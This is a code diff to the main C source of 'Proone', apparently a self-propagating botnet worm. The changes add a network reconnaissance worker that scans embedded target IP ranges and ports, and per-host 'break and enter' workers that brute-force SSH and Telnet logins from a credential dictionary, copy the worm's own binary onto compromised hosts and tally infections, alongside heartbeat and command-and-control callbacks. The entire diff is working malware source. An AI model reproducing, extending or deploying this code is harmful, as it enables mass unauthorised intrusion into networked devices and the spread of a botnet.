@@ -21,6 +21,7 @@
 #include <libssh2.h>
 
 #include "config.h"
+#include "proone_conf/config.h"
 #include "proone.h"
 #include "protocol.h"
 #include "util_rt.h"
@@ -28,6 +29,10 @@
 #include "dvault.h"
 #include "llist.h"
 #include "mbedtls.h"
+#include "htbt.h"
+#include "recon.h"
+#include "bne.h"
+#include "inet.h"
 
 
 struct prne_global prne_g;
@@ -37,6 +42,8 @@ sigset_t ss_exit, ss_all;
 
 static prne_worker_t wkr_arr[3];
 static size_t wkr_cnt;
+static prne_llist_t bne_list;
+static prne_bne_param_t bne_param;
 
 static void alloc_resolv (void) {
 	prne_resolv_ns_pool_t pool4, pool6;
@@ -78,9 +85,15 @@ static void alloc_resolv (void) {
 		pool4,
 		pool6);
 	if (prne_g.resolv != NULL) {
+		wkr_arr[wkr_cnt].attr = pth_attr_new();
+		pth_attr_set(wkr_arr[wkr_cnt].attr, PTH_ATTR_PRIO, PTH_PRIO_STD + 1);
+
 		wkr_cnt += 1;
 		pool4.ownership = false;
 		pool6.ownership = false;
+	}
+	else if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+		prne_dbgperr("prne_alloc_resolv()");
 	}
 
 END:
@@ -89,13 +102,13 @@ END:
 	prne_resolv_free_ns_pool(&pool6);
 }
 
-static bool cb_htbt_cnc_txtrec (char *out) {
+static bool cb_htbt_cnc_txtrec (void *ctx, char *out) {
 	strcpy(out, prne_dvault_get_cstr(PRNE_DATA_KEY_CNC_TXT_REC, NULL));
 	prne_dvault_reset();
 	return true;
 }
 
-static bool cb_htbt_hostinfo (prne_htbt_host_info_t *out) {
+static bool cb_htbt_hostinfo (void *ctx, prne_htbt_host_info_t *out) {
 	const struct timespec ts_now = prne_gettime(CLOCK_MONOTONIC);
 
 	out->parent_uptime = prne_sub_timespec(ts_now, prne_g.parent_start).tv_sec;
@@ -131,7 +144,7 @@ static bool cb_htbt_hostinfo (prne_htbt_host_info_t *out) {
 	return true;
 }
 
-static char *cb_htbt_tmpfile (size_t req_size, const mode_t mode) {
+static char *cb_htbt_tmpfile (void *ctx, size_t req_size, const mode_t mode) {
 	uint8_t m[16];
 	char *path = prne_alloc_str(36 + 3), *ret = NULL;
 	int fd = -1;
@@ -173,7 +186,11 @@ static char *cb_htbt_tmpfile (size_t req_size, const mode_t mode) {
 	return ret;
 }
 
-static bool cb_htbt_nybin (const char *path, const prne_htbt_cmd_t *cmd) {
+static bool cb_htbt_nybin (
+	void *ctx,
+	const char *path,
+	const prne_htbt_cmd_t *cmd)
+{
 	const size_t strsize = prne_nstrlen(path) + 1;
 
 	if (prne_s_g == NULL ||
@@ -193,6 +210,7 @@ static bool cb_htbt_nybin (const char *path, const prne_htbt_cmd_t *cmd) {
 
 
 static void alloc_htbt (void) {
+	prne_htbt_t *htbt;
 	prne_htbt_param_t param;
 
 	prne_htbt_init_param(&param);
@@ -211,15 +229,202 @@ static void alloc_htbt (void) {
 	param.cb_f.ny_bin = cb_htbt_nybin;
 	param.blackhole = prne_g.blackhole[1];
 
-	prne_g.htbt = prne_alloc_htbt(
+	htbt = prne_alloc_htbt(
 		wkr_arr + wkr_cnt,
 		&param);
-	if (prne_g.htbt != NULL) {
+	if (htbt != NULL) {
+		wkr_arr[wkr_cnt].attr = pth_attr_new();
+		pth_attr_set(wkr_arr[wkr_cnt].attr, PTH_ATTR_PRIO, PTH_PRIO_STD + 1);
+
 		wkr_cnt += 1;
+	}
+	else if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+		prne_dbgperr("prne_alloc_htbt()");
 	}
 
 END:
 	prne_htbt_free_param(&param);
+}
+
+static void cb_recon_evt (void *ctx, const prne_net_endpoint_t *ep) {
+	prne_llist_entry_t *e = NULL;
+	prne_worker_t *w = NULL;
+	prne_bne_t *bne;
+
+	if (bne_list.size >= PROONE_BNE_MAX_CNT) {
+		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_WARN) {
+			prne_dbgperr("* PROONE_BNE_MAX_CNT reached!\n");
+		}
+		return;
+	}
+
+	for (e = bne_list.head; e != NULL; e = e->next) {
+		w = (prne_worker_t*)e->element;
+		bne = (prne_bne_t*)w->ctx;
+
+		if (prne_eq_ipaddr(&ep->addr, prne_bne_get_subject(bne))) {
+			return;
+		}
+	}
+
+// TRY
+	w = prne_malloc(sizeof(prne_worker_t), 1);
+	if (w == NULL) {
+		goto END;
+	}
+	prne_init_worker(w);
+
+	e = prne_llist_append(&bne_list, (prne_llist_element_t)w);
+	if (e == NULL) {
+		goto END;
+	}
+
+	bne_param.subject = ep->addr;
+	bne = prne_alloc_bne(w, &prne_g.ssl.rnd, &bne_param);
+	if (bne == NULL) {
+		goto END;
+	}
+	w->attr = pth_attr_new();
+	pth_attr_set(w->attr, PTH_ATTR_PRIO, PTH_PRIO_STD - 1);
+
+	w->pth = pth_spawn(w->attr, w->entry, w->ctx);
+	if (w->pth == NULL) {
+		goto END;
+	}
+
+	pth_raise(prne_g.main_pth, SIGINT);
+	e = NULL;
+	w = NULL;
+
+END: // CATCH
+	if (e != NULL) {
+		prne_llist_erase(&bne_list, e);
+	}
+	if (w != NULL) {
+		prne_free_worker(w);
+		prne_free(w);
+	}
+}
+
+static void alloc_recon (void) {
+	prne_recon_t *rcn;
+	prne_recon_param_t param;
+	size_t dvl, cnt;
+	const uint8_t *m;
+	size_t i;
+
+	prne_init_recon_param(&param);
+
+// TRY
+	param.evt_cb = cb_recon_evt;
+
+	// load ports
+	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_PORTS, &dvl);
+	cnt = dvl / 2;
+	if (!prne_alloc_recon_param(
+		&param,
+		param.blist.cnt,
+		param.target.cnt,
+		cnt))
+	{
+		goto END;
+	}
+	for (i = 0; i < cnt; i += 1) {
+		param.ports.arr[i] = prne_recmb_msb16(m[0], m[1]);
+		m += 2;
+	}
+
+	// load ipv4 targets
+	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_T_IPV4, &dvl);
+	cnt = dvl / 5;
+	if (!prne_alloc_recon_param(
+		&param,
+		param.blist.cnt,
+		cnt,
+		param.ports.cnt))
+	{
+		goto END;
+	}
+	for (i = 0; i < cnt; i += 1) {
+		prne_memzero(param.target.arr + i, sizeof(prne_recon_network_t));
+
+		param.target.arr[i].addr.ver = PRNE_IPV_4;
+		memcpy(param.target.arr[i].addr.addr, m, 4);
+		prne_netmask_from_cidr(param.target.arr[i].mask, m[4]);
+		m += 5;
+	}
+	/* reuse i */
+	// load ipv6 targets
+	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_T_IPV6, &dvl);
+	cnt = dvl / 17;
+	if (!prne_alloc_recon_param(
+		&param,
+		param.blist.cnt,
+		param.target.cnt + cnt,
+		param.ports.cnt))
+	{
+		goto END;
+	}
+	for (; i < param.target.cnt; i += 1) {
+		prne_memzero(param.target.arr + i, sizeof(prne_recon_network_t));
+
+		param.target.arr[i].addr.ver = PRNE_IPV_6;
+		memcpy(param.target.arr[i].addr.addr, m, 16);
+		prne_netmask_from_cidr(param.target.arr[i].mask, m[16]);
+		m += 17;
+	}
+
+	// load ipv4 blacklists
+	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_BL_IPV4, &dvl);
+	cnt = dvl / 5;
+	if (!prne_alloc_recon_param(
+		&param,
+		cnt,
+		param.target.cnt,
+		param.ports.cnt))
+	{
+		goto END;
+	}
+	for (i = 0; i < cnt; i += 1) {
+		prne_memzero(param.blist.arr + i, sizeof(prne_recon_network_t));
+
+		param.blist.arr[i].addr.ver = PRNE_IPV_4;
+		memcpy(param.blist.arr[i].addr.addr, m, 4);
+		prne_netmask_from_cidr(param.blist.arr[i].mask, m[4]);
+		m += 5;
+	}
+	/* reuse i */
+	// load ipv6 blacklists
+	m = prne_dvault_get_bin(PRNE_DATA_KEY_RCN_BL_IPV6, &dvl);
+	cnt = dvl / 17;
+	if (!prne_alloc_recon_param(
+		&param,
+		param.blist.cnt + cnt,
+		param.target.cnt,
+		param.ports.cnt))
+	{
+		goto END;
+	}
+	for (; i < param.blist.cnt; i += 1) {
+		prne_memzero(param.blist.arr + i, sizeof(prne_recon_network_t));
+
+		param.blist.arr[i].addr.ver = PRNE_IPV_6;
+		memcpy(param.blist.arr[i].addr.addr, m, 16);
+		prne_netmask_from_cidr(param.blist.arr[i].mask, m[16]);
+		m += 17;
+	}
+
+	rcn = prne_alloc_recon(wkr_arr + wkr_cnt, &prne_g.ssl.rnd, &param);
+	if (rcn != NULL) {
+		param.ownership = false;
+		wkr_cnt += 1;
+	}
+	else if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
+		prne_dbgperr("prne_alloc_recon()");
+	}
+
+END: // CATCH
+	prne_free_recon_param(&param);
 }
 
 static void alloc_workers (void) {
@@ -228,6 +433,7 @@ static void alloc_workers (void) {
 	}
 	alloc_resolv();
 	alloc_htbt();
+	alloc_recon();
 }
 
 static void free_workers (void) {
@@ -235,7 +441,6 @@ static void free_workers (void) {
 		prne_free_worker(wkr_arr + i);
 	}
 	prne_g.resolv = NULL;
-	prne_g.htbt = NULL;
 }
 
 static void seed_ssl_rnd (const bool use_bent) {
@@ -265,44 +470,135 @@ static void seed_ssl_rnd (const bool use_bent) {
 	}
 }
 
+static pth_event_t build_bne_ev (void) {
+	pth_event_t ret = NULL, ev;
+	prne_worker_t *w;
+
+	for (prne_llist_entry_t *e = bne_list.head; e != NULL; e = e->next) {
+		w = (prne_worker_t*)e->element;
+		ev = pth_event(PTH_EVENT_TID | PTH_UNTIL_TID_DEAD, w->pth);
+		prne_assert(ev != NULL);
+
+		if (ret == NULL) {
+			ret = ev;
+		}
+		else {
+			pth_event_concat(ret, ev, NULL);
+		}
+	}
+
+	return ret;
+}
+
+static void proc_bne_result (const prne_bne_result_t *r) {
+	if (prne_s_g != NULL) {
+		prne_s_g->bne_cnt += 1;
+		if (r->ny_instance) {
+			prne_s_g->infect_cnt += 1;
+		}
+	}
+}
+
+static void reap_bne (void) {
+	pth_state_t st;
+	prne_worker_t *w;
+	pth_attr_t a;
+	const prne_bne_result_t *r;
+
+	for (prne_llist_entry_t *e = bne_list.head; e != NULL;) {
+		w = (prne_worker_t*)e->element;
+		a = pth_attr_of(w->pth);
+		pth_attr_get(a, PTH_ATTR_STATE, &st);
+		pth_attr_destroy(a);
+
+		if (st == PTH_STATE_DEAD) {
+			r = NULL;
+			pth_join(w->pth, (void**)&r);
+			w->pth = NULL;
+
+			proc_bne_result(r);
+
+			prne_free_worker(w);
+			prne_free(w);
+			e = prne_llist_erase(&bne_list, e);
+		}
+		else {
+			e = e->next;
+		}
+	}
+}
+
 /* proone_main()
 * Actual main where all dangerous stuff happens.
 * Most of long-lived variables are declared static so there's little stack
-* allocation involvedsince stack allocation can cause page fault.
+* allocation involved since stack allocation can cause page fault.
 */
 static int proone_main (void) {
 	static int caught_sig;
+	static pth_event_t root_ev = NULL;
 
 	prne_assert(pth_init());
 	prne_assert(libssh2_init(0) == 0);
 	prne_g.main_pth = pth_self();
-
+	{
+		// set priority of main pth to max
+		pth_attr_t attr = pth_attr_of(prne_g.main_pth);
+		pth_attr_set(attr, PTH_ATTR_PRIO, PTH_PRIO_MAX);
+		pth_attr_destroy(attr);
+	}
 	seed_ssl_rnd(true);
-	alloc_workers();
 
+	alloc_workers();
 	for (size_t i = 0; i < wkr_cnt; i += 1) {
-		wkr_arr[i].pth = pth_spawn(PTH_ATTR_DEFAULT, wkr_arr[i].entry, wkr_arr[i].ctx);
+		wkr_arr[i].pth = pth_spawn(
+			wkr_arr[i].attr,
+			wkr_arr[i].entry,
+			wkr_arr[i].ctx);
 		prne_assert(wkr_arr[i].pth != NULL);
 	}
 
 	while (true) {
-		prne_assert(pth_sigwait(&ss_all, &caught_sig) == 0);
-		if (sigismember(&ss_exit, caught_sig) && caught_sig != SIGINT) {
+		pth_event_free(root_ev, TRUE);
+		root_ev = build_bne_ev();
+
+		caught_sig = -1;
+		pth_sigwait_ev(&ss_all, &caught_sig, root_ev);
+		if (caught_sig >= 0 &&
+			sigismember(&ss_exit, caught_sig) &&
+			caught_sig != SIGINT)
+		{
 			break;
 		}
+
+		reap_bne();
 	}
 	sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
 
+	// reap generic workers
 	for (size_t i = 0; i < wkr_cnt; i += 1) {
 		prne_fin_worker(wkr_arr + i);
 	}
 	for (size_t i = 0; i < wkr_cnt; i += 1) {
 		prne_assert(pth_join(wkr_arr[i].pth, NULL));
-		prne_free_worker(wkr_arr + i);
+		wkr_arr[i].pth = NULL;
 	}
-
 	free_workers();
 
+	// reap bne workers
+	for (prne_llist_entry_t *e = bne_list.head; e != NULL; e = e->next) {
+		prne_worker_t *w = (prne_worker_t*)e->element;
+		prne_bne_result_t *r = NULL;
+
+		pth_join(w->pth, (void**)&r);
+		w->pth = NULL;
+		proc_bne_result(r);
+
+		prne_free_worker(w);
+		prne_free(w);
+	}
+	prne_llist_clear(&bne_list);
+
+	pth_event_free(root_ev, TRUE);
 	pth_kill();
 	libssh2_exit();
 
@@ -421,6 +717,7 @@ static void init_proone (const char *self) {
 	prne_assert(elf->e_ident[EI_CLASS] == EXPTD_CLASS);
 	prne_assert(elf->e_ident[EI_DATA] == EXPTD_DATA);
 
+	prne_g.self_size = (size_t)file_size;
 	prne_g.exec_size = elf->e_shoff + (elf->e_shentsize * elf->e_shnum);
 	prne_g.exec_size = prne_salign_next(prne_g.exec_size, PRNE_BIN_ALIGNMENT);
 	prne_massert(
@@ -999,6 +1296,75 @@ END:
 	prne_free(args);
 }
 
+static bool bne_cb_enter_dd (void *ctx) {
+	prne_dvault_get_bin(PRNE_DATA_KEY_CRED_DICT, NULL);
+	return true;
+}
+
+static void bne_cb_exit_dd (void *ctx) {
+	prne_dvault_reset();
+}
+
+static char *bne_cb_exec_name (void *ctx) {
+	size_t dvl;
+	const char *dv_str;
+	char *ret;
+
+	dv_str = prne_dvault_get_cstr(PRNE_DATA_KEY_EXEC_NAME, &dvl);
+	ret = prne_alloc_str(dvl);
+	if (ret != NULL) {
+		memcpy(ret, dv_str, dvl + 1);
+	}
+
+	return ret;
+}
+
+static void init_bne (void) {
+	static const prne_bne_vector_t VEC_ARR[] = {
+		PRNE_BNE_V_HTBT,
+		PRNE_BNE_V_BRUTE_SSH,
+		PRNE_BNE_V_BRUTE_TELNET
+	};
+	size_t dvl;
+	const uint8_t *m;
+
+	prne_init_cred_dict(&prne_g.cred_dict);
+	prne_init_llist(&bne_list);
+	prne_init_bne_param(&bne_param);
+
+	m = prne_dvault_get_bin(PRNE_DATA_KEY_CRED_DICT, &dvl);
+	prne_dser_cred_dict(&prne_g.cred_dict, m, dvl);
+	bne_param.cred_dict = &prne_g.cred_dict;
+	prne_dvault_reset();
+
+	if (prne_g.c_ssl.ready) {
+		bne_param.htbt_ssl_conf = &prne_g.c_ssl.conf;
+	}
+
+	bne_param.vector.arr = VEC_ARR;
+	bne_param.vector.cnt = sizeof(VEC_ARR)/sizeof(prne_bne_vector_t);
+
+	bne_param.cb.exec_name = bne_cb_exec_name;
+	bne_param.cb.enter_dd = bne_cb_enter_dd;
+	bne_param.cb.exit_dd = bne_cb_exit_dd;
+
+	bne_param.rcb.m_self = prne_g.m_exec;
+	bne_param.rcb.self_len = prne_g.self_size;
+	bne_param.rcb.exec_len = prne_g.exec_size;
+	bne_param.rcb.m_dv = prne_g.m_exec_dvault;
+	bne_param.rcb.dv_len = prne_g.dvault_size;
+	bne_param.rcb.ba = &prne_g.bin_archive;
+	bne_param.rcb.self = prne_host_arch;
+
+	bne_param.login_attempt = PRNE_BNE_LOGIN_ATTEMPT;
+}
+
+static void deinit_bne (void) {
+	prne_free_llist(&bne_list);
+	prne_free_cred_dict(&prne_g.cred_dict);
+	prne_free_bne_param(&bne_param);
+}
+
 
 int main (const int argc, const char **args) {
 	static int exit_code;
@@ -1044,6 +1410,7 @@ int main (const int argc, const char **args) {
 	seed_ssl_rnd(false);
 	load_ssl_conf();
 	init_ids();
+	init_bne();
 	if (!init_shared_global()) {
 		prne_dbgpf("*** Another instance detected.\n");
 		exit_code = PRNE_PROONE_EC_LOCK;
@@ -1152,6 +1519,7 @@ int main (const int argc, const char **args) {
 	prne_g.child_pid = 0;
 
 END:
+	deinit_bne();
 	prne_free_bin_archive(&prne_g.bin_archive);
 
 	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
